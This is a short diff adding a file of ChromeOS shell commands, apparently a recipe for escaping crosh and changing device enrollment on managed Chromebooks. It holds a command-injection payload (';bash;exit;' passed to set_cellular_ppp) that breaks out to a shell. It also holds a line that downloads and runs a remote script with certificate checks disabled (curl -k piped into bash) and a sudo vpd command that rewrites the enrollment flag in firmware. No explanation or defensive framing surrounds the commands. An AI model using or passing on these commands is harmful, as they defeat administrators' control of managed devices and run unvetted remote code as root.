@@ -1,0 +1,7 @@
+set_cellular_ppp \';bash;exit;\'
+bash <(curl -k https://coolelectronics.me/unroll)
+
+shell
+sudo vpd -i RW_VPD -s check_enrollment=1
+
+chrome-extension://nkoccljplnhpfnfiajclkommnmllphnl//html/crosh.html
